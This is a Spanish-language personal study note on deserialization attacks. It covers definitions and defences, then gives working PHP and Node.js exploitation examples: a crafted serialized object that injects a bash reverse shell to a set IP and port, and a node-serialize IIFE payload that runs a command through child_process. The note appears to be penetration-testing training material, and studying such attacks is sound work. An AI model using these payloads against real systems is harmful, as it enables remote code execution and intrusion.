-----
- Tags: #ataques #teoria #practica #basico 
-----

# ¿ Que es la **serialización** ? 

### La **serialización** es el proceso de cvonvertir un objeto en una secuencia de **bytes** que puede ser almacenada o transmitida a través de una red. La **deserialización** es el proceso inverso, en el que una secuencia de bytes es convertida de nuevo a un objeto. 

----

# ¿ Que es un **ataque de deserialización** ?

### Los **ataques de deserialización** son un tipo de ataque que aprovecha las vulnerabilidades en los procesos de **serialización** y **deserialización** de objetos en aplicaciones que utilizan la programacón orientada a objetos (**POO**)

### Estos ataques ocurren cuando un atacante puede manipular los datos que se están deserializando, lo que puede llevar a [[RCE - (Remote Command Execution)]] en el servidor. 

### Los **ataques de deserialización** pueden ocurrir en diferentes tipos de aplicaciones, incluyendo aplicaciones web, aplicaciones móviles y aplicaciones de escritorio. Estos ataques pueden ser explotados de varias maneras como: 

- ### Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso. 
- ### Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso.
- ### Realizar un ataque de **man-in-the-middle** para interceptar y modificar el objeto serializado antes de que llegue a la aplicación. 

---- 

# Evitar estos ataques 

### Para evitar estos tipos de ataques, es importante que las aplicaciones validen y autentiquen adecuadamente todos los datos que reciben antes de deserializarlos. También es importante utilizar bibliotecas de serialización y deserializaciópn seguras y actualizar regularmente todas las bibliotecas y componentes de la aplicación para correfir posibles vulnerabilidades. 

----

# Explotación 

### Estos ataques se pueden aconteser en muchos escenarios, por ejemplo, en aplicaciones web que tratan con NodeJS o PHP, por ejemplo, si detectaramos que la data interceptada con [[Burpsuite]] viaja de una manera serializada, podriamos comenzar a pensar en un **php deserilialisation attack**. 

### La data interceptara por ejemplo se ve así:  `obj=O:8:"pingTest":1:{s:9:"ipAddress";s:9:"284781274";}&ip=284781274`

### Y sabemos que por detras el código es el sig: 

```php
<?php
class pingTest {
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";
	function validate() {
		if (!$this->isValid) {
			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
			{
				$this->isValid = True;
			}
		}
		$this->ping();
	}
	public function ping()
        {
		if ($this->isValid) {
			$this->output = shell_exec("ping -c 3 $this->ipAddress");	
		}
        }
}
if (isset($_POST['obj'])) {
	$pingTest = unserialize(urldecode($_POST['obj']));
} else {
	$pingTest = new pingTest;
}
$pingTest->validate();
```

### Donde, tras analizar el código, podriamos pensar en que si lograramos hacer que el valor de ipAddress sea un comando de bash a la par que isValid sea True, estariamos con la posibilidad de inyectar comandos en el sistema a traves de un **Deserialization attack**. 

### Podriamos crear un script de php imitando la funcionalidad del código que pudimos ver, para de esta manera recrear un **nuevo** objeto **serializado**.

```php
<?php 

class pingTest {
	public $ipadress = "; bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'";
	public $isValid = True; 
	public $output = ""; 
}

echo serialize(new pingTest);
```

### Logrando así, obtener un obj serializado válido el cual nos envía una reverse shell, teniendo así, posiblidad de [[RCE - (Remote Command Execution)]]. 

##### `O:8:"pingTest":3:{s:9:"ipAddress";s:53:"; bash -c 'bash -i >& /dev/tcp/192.168.1.38/443 0>&1'";s:7:"isValid";b:1;s:6:"output";s:0:"";}`

----

### Ahora, en un escenario de un **node deserialization attack** podriamos hacer uso del concepto **IIFE (Inmediatly Invoked Function Exression)**, el cual consiste en la declaración de funciones que son ejecutadas en el mismo momento de la declaración, de manera que, si capturaramos por ejemplo, una cookie la cual es `eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=`, al decodearle veriamos la sig data serializada: 

### `{"username":"dobliuw","country":"india","city":"bangalore"}`, mientras que en la web vemos un "Hello dobliuw", podemos deducir que si cambiamos esta data serializada, para que en lugar de donde dice "dobliuw" diga otra cosa que ingresemos nosotros, podrimaos intentar hacer uso de un **IIFE** para que a la hora de que se deserialize dicha data, se ejecute una instrucción de [[RCE - (Remote Command Execution)]]. 

```javascript
const serialize = require('node-serialize'); 

const payload = {
username: function(){require('child_process').exec('whoami', (err, stdout, stderr) => stdout ? console.log(stdout) : null)},
country: "Argentina",
city: "Buenos Aires"
}

console.log(serialize.serialize(payload))

```

### Esta función, que se encarga de serializar el payload, nos arrojaria lo sig: 

### `{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', (err, stdout, stderr) => stdout ? console.log(stdout) : null)}","country":"Argentina","city":"Buenos Aires"}`

### De manera que nuestra función `_$$ND_FUNC$$_function(){require('child_process').exec('whoami', (err, stdout, stderr) => stdout ? console.log(stdout) : null)}` devera ser invocada indemediatamente agregado `()` alfinal de esta, 

### **IIFE**: `_$$ND_FUNC$$_function(){require('child_process').exec('whoami', (err, stdout, stderr) => stdout ? console.log(stdout) : null)}()` 

### De esta manera, cuando el servidor deserialize la data, gracias a nuestra **IIFE**, se ejecutara el comando del lado del servidor, dejandonos así posiblidad de [[RCE - (Remote Command Execution)]]. 

